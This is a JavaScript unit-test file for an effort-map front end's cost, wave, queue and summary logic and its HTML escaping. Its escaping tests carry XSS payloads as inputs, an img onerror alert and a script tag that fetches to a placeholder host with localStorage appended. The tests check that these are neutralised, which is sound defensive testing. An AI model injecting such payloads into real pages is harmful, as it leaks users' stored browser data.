/* Tests for the effort-map shaping logic.
 *
 * `node --test test/` — the built-in runner and assert module, no dependencies and no
 * browser. That is the point of keeping `effortmap.js` free of the DOM and of wasm.
 *
 * These are a port of `apps/effortmap/test_effortmap.py`, over the same fixtures, so
 * the two front ends can be diffed for behaviour rather than trusted to agree.
 */

import { test } from "node:test";
import assert from "node:assert/strict";

import {
  basisName,
  breakdownRows,
  effortRows,
  heaviest,
  partitionCount,
  queueNdjson,
  queueRows,
  seriesColors,
  sourcesFromJson,
  summary,
  waveRows,
  ORIGIN_DOMAIN,
} from "../assets/effortmap.js";

// stg -> {mart_a, wide}: two whole-model rebuilds and one scoped to two partitions.
const COLD = {
  models: [
    { name: "stg", reason: "directly_changed", unit: "full_model" },
    {
      name: "mart_a",
      reason: { downstream: { because_of: "stg", via_columns: ["amount"] } },
      unit: "full_model",
    },
    {
      name: "wide",
      reason: { downstream: { because_of: "stg", via_columns: ["amount"] } },
      unit: { partitions: ["2026-09-01", "2026-09-02"] },
    },
  ],
  cost: {
    total_millicu: 2200,
    per_model: [
      { model: "stg", millicu: 1000, basis: "table_full" },
      { model: "mart_a", millicu: 1000, basis: "table_full" },
      { model: "wide", millicu: 200, basis: { incremental_partitions: { count: 2 } } },
    ],
  },
  queue: {
    items: [
      { seq: 0, model: "stg", depends_on: [], millicu: 1000, wave: 0 },
      { seq: 1, model: "mart_a", depends_on: ["stg"], millicu: 1000, wave: 1 },
      { seq: 2, model: "wide", partition: "2026-09-01", depends_on: ["stg"], millicu: 100, wave: 1 },
      { seq: 3, model: "wide", partition: "2026-09-02", depends_on: ["stg"], millicu: 100, wave: 1 },
    ],
    waves: [[0], [1, 2, 3]],
  },
};

const NO_COST = { models: [{ name: "solo", reason: "directly_changed", unit: "full_model" }] };

// ── effort rows ───────────────────────────────────────────────────────────────

test("rows are sorted by cost descending so the dominant models lead", () => {
  assert.deepEqual(effortRows(COLD).map((r) => r.model), ["mart_a", "stg", "wide"]);
});

test("ties break by name so the order is stable across renders", () => {
  const equal = effortRows(COLD).filter((r) => r.millicu === 1000).map((r) => r.model);
  assert.deepEqual(equal, [...equal].sort());
});

test("origin separates the change from its blast radius", () => {
  const by = Object.fromEntries(effortRows(COLD).map((r) => [r.model, r]));
  assert.equal(by.stg.origin, "changed");
  assert.equal(by.stg.becauseOf, "");
  assert.equal(by.mart_a.origin, "downstream");
  assert.equal(by.mart_a.becauseOf, "stg");
  assert.equal(by.mart_a.viaColumns, "amount");
});

test("a partition-scoped model says how many, a whole one says so", () => {
  const by = Object.fromEntries(effortRows(COLD).map((r) => [r.model, r]));
  assert.equal(by.wide.unit, "2 partitions");
  assert.equal(by.wide.basisLabel, "partition-scoped");
  assert.equal(by.stg.unit, "whole model");
  assert.equal(by.stg.basisLabel, "full table rebuild");
});

test("rows survive a plan with no cost, without inventing a basis", () => {
  const rows = effortRows(NO_COST);
  assert.equal(rows.length, 1);
  assert.equal(rows[0].cu, null);
  assert.equal(rows[0].basisLabel, "");
});

// ── waves ─────────────────────────────────────────────────────────────────────

test("waves report their items, models and cost", () => {
  const waves = waveRows(COLD);
  assert.deepEqual(waves.map((w) => w.wave), [0, 1]);
  assert.equal(waves[0].items, 1);
  assert.equal(waves[1].items, 3);
  assert.deepEqual(waves[1].models, ["mart_a", "wide"]);
});

test("wave costs sum to the plan total", () => {
  assert.equal(waveRows(COLD).reduce((s, w) => s + w.millicu, 0), COLD.cost.total_millicu);
});

test("no queue means no waves rather than an error", () => {
  assert.deepEqual(waveRows(NO_COST), []);
});

// ── breakdown ─────────────────────────────────────────────────────────────────

test("only partition-scoped models appear in the breakdown", () => {
  const rows = breakdownRows(COLD);
  assert.deepEqual(rows.map((r) => r.model), ["wide"]);
  assert.equal(rows[0].partitions, 2);
  assert.equal(rows[0].first, "2026-09-01");
  assert.equal(rows[0].last, "2026-09-02");
});

test("a whole-model rebuild is not a breakdown of one", () => {
  assert.deepEqual(breakdownRows(NO_COST), []);
});

// ── queue ─────────────────────────────────────────────────────────────────────

test("items are in execution order and labelled with their partition", () => {
  const rows = queueRows(COLD);
  assert.deepEqual(rows.map((r) => r.seq), [0, 1, 2, 3]);
  assert.equal(rows[2].target, "wide[2026-09-01]");
  assert.equal(rows[0].target, "stg");
  assert.equal(rows[1].dependsOn, "stg");
});

test("ndjson is one object per line, parses, and sums to the plan total", () => {
  const lines = queueNdjson(COLD).split("\n");
  assert.equal(lines.length, 4);
  const parsed = lines.map((l) => JSON.parse(l));
  assert.deepEqual(parsed.map((p) => p.seq), [0, 1, 2, 3]);
  assert.equal(parsed[2].partition, "2026-09-01");
  assert.equal(parsed.reduce((s, p) => s + p.millicu, 0), COLD.cost.total_millicu);
});

test("ndjson keys are sorted so two exports of one plan diff cleanly", () => {
  const keys = Object.keys(JSON.parse(queueNdjson(COLD).split("\n")[0]));
  assert.deepEqual(keys, [...keys].sort());
});

// ── summary ───────────────────────────────────────────────────────────────────

test("summary counts the change and its blast radius", () => {
  const s = summary(COLD);
  assert.equal(s.models, 3);
  assert.equal(s.directlyChanged, 1);
  assert.equal(s.downstream, 2);
  assert.equal(s.workItems, 4);
  assert.equal(s.depth, 2);
  assert.equal(s.width, 3);
  assert.equal(s.totalCu, 2.2);
});

test("absent cost is null, not zero", () => {
  // A zero would read as "this rebuild is free", a different claim from "nobody asked".
  const s = summary(NO_COST);
  assert.equal(s.totalCu, null);
  assert.equal(s.totalMillicu, null);
  assert.equal(s.workItems, null);
  assert.equal(s.avoidedCu, null);
});

test("avoided work is the unpruned baseline minus the plan, never negative", () => {
  const plan = (total, unpruned) => ({ models: [], cost: { total_millicu: total, per_model: [], unpruned_millicu: unpruned } });
  assert.equal(summary(plan(2000, 5000)).avoidedCu, 3);
  assert.equal(summary(plan(3000, 1000)).avoidedMillicu, 0);
  // A pre-v5 producer sends no baseline: unknown, not "saved nothing".
  assert.equal(summary({ models: [], cost: { total_millicu: 2000, per_model: [] } }).avoidedCu, null);
});

test("heaviest is stable under ties", () => {
  const plan = {
    cost: {
      total_millicu: 3000,
      per_model: [
        { model: "b", millicu: 1000, basis: "table_full" },
        { model: "a", millicu: 1000, basis: "table_full" },
        { model: "c", millicu: 1000, basis: "table_full" },
      ],
    },
  };
  assert.deepEqual(heaviest(plan, 2).map((m) => m.model), ["a", "b"]);
});

// ── enum unwrapping ───────────────────────────────────────────────────────────

test("a data-carrying basis flattens to its name and exposes its count", () => {
  const basis = { incremental_partitions: { count: 3 } };
  assert.equal(basisName(basis), "incremental_partitions");
  assert.equal(partitionCount(basis), 3);
});

test("a bare basis has no partition count", () => {
  assert.equal(basisName("table_full"), "table_full");
  assert.equal(partitionCount("table_full"), null);
});

// ── palette ───────────────────────────────────────────────────────────────────

test("both modes define both series as hex", () => {
  for (const dark of [false, true]) {
    const colors = seriesColors(dark);
    assert.deepEqual(Object.keys(colors).sort(), ["direct", "downstream"]);
    for (const hex of Object.values(colors)) assert.match(hex, /^#[0-9a-f]{6}$/);
  }
});

test("the dark steps are not the light palette reused", () => {
  // Reusing the light steps on a dark surface is what fails the contrast check.
  assert.notDeepEqual(seriesColors(false), seriesColors(true));
});

test("the category order is fixed", () => {
  assert.deepEqual([...ORIGIN_DOMAIN], ["changed", "downstream"]);
});

// ── sources ───────────────────────────────────────────────────────────────────

test("sources parse, an empty box is empty, an array is refused", () => {
  assert.deepEqual(sourcesFromJson('{"raw": ["a"]}'), { raw: ["a"] });
  assert.deepEqual(sourcesFromJson("   "), {});
  assert.throws(() => sourcesFromJson('["raw"]'), /JSON object/);
});

// ── html escaping ─────────────────────────────────────────────────────────────
// The one place these tests reach past `effortmap.js`. `app.js` is the DOM, so it
// takes a stub `document` to import at all — worth the stub, because what is pinned
// here is the boundary between a `.sql` filename somebody picked off disk and script
// running in the page's origin, which is where the remembered fingerprints live.

const stubNode = () => ({
  addEventListener() {},
  appendChild() {},
  setAttribute() {},
  querySelector: () => stubNode(),
  style: {},
});
globalThis.window = {};
globalThis.document = {
  getElementById: stubNode,
  querySelectorAll: () => [],
  createElement: stubNode,
  createElementNS: stubNode,
  documentElement: {},
};

const { escapeHtml, table } = await import("../assets/app.js");

/** Render one table and hand back the markup it assigned. */
function render(headers, rows) {
  const node = stubNode();
  table(node, headers, rows);
  return node.innerHTML;
}

test("every character that could open a tag or close an attribute is escaped", () => {
  assert.equal(escapeHtml(`<img src=x onerror="alert(1)">`), "&lt;img src=x onerror=&quot;alert(1)&quot;&gt;");
  assert.equal(escapeHtml("a & b"), "a &amp; b");
  assert.equal(escapeHtml("it's"), "it&#39;s");
  // `&` first, or an escape would be escaped again into `&amp;lt;`.
  assert.equal(escapeHtml("&lt;"), "&amp;lt;");
});

test("nothing renders as nothing, not as the word null", () => {
  assert.equal(escapeHtml(null), "");
  assert.equal(escapeHtml(undefined), "");
  assert.equal(escapeHtml(0), "0", "a real zero is not nothing");
});

test("a hostile model name reaches a table as text, not as markup", () => {
  // A file named `<script>…</script>.sql` is a legal filename on every platform here.
  const html = render(["Model"], [["<script>fetch('//x/'+localStorage)</script>"]]);
  assert.ok(!html.includes("<script"), html);
  assert.ok(html.includes("&lt;script&gt;"), html);
});

test("headers are escaped as well as cells", () => {
  assert.ok(render(["<b>Model</b>"], [["stg"]]).includes("&lt;b&gt;Model&lt;/b&gt;"));
});

test("markup in a cell is opt-in, and numbers stay right-aligned", () => {
  const html = render(["Model", "Why", "CU"], [
    ["stg", { html: `<span class="pill changed">changed</span>` }, { num: "1.00" }],
  ]);
  assert.ok(html.includes(`<span class="pill changed">changed</span>`), html);
  assert.ok(html.includes(`<td class="num">1.00</td>`), html);
  // Only the `{ num }` column takes the numeric header class — a `{ html }` cell is
  // markup, not a figure, and right-aligning its column would be wrong.
  assert.equal(html.match(/<th class="num">/g).length, 1, html);
});
